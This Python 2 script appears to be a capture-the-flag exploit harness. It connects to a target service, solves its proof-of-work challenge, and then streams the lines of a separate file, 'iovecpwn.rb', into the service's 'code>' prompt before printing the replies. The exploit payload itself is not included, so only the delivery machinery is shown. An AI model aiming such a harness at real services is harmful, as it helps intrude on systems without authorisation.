import time
import telnetlib
import sys
import binascii
import struct
import socket

def info(s):
    print "[*] %s" % s

HOST = "127.0.0.1" if len(sys.argv) < 2 else sys.argv[1]
PORT = 4444 if len(sys.argv) < 2 else int(sys.argv[2])
TARGET = (HOST, PORT)

info("Starting pwn on %s:%d" % (HOST,PORT))
sock=socket.create_connection(TARGET)

def ru(delim):
    buf = ""
    while not delim in buf:
        buf += sock.recv(1)
    return buf

def interact():
    info("Switching to interactive mode")
    t=telnetlib.Telnet()
    t.sock = sock
    t.interact()

p32 = lambda v: struct.pack("<i", v)
p64 = lambda v: struct.pack("<q", v)
u32 = lambda v: struct.unpack("<i", v)[0]
u64 = lambda v: struct.unpack("<q", v)[0]

sa = lambda s: sock.sendall(s)

import subprocess
def solve_pow(task):
    sol = subprocess.check_output(["../pow.py", task])
    sol = sol.split("\n")[-2]
    assert "Solution" in sol
    sol = sol.split(": ")[1]
    info("sol is %s" % sol)
    return sol

ru("challenge: ")
task = ru("\n").rstrip()
info("task is %s" % task)
sa(solve_pow(task) + "\n")

with open("iovecpwn.rb", "r") as f:

    l = f.readlines()[3:]
    for i in l:
        ru("code> ")
        sa(i)

    sa("END_OF_PWN\n")


    print sock.recv(1024)
    print sock.recv(3072)
    print sock.recv(3072)

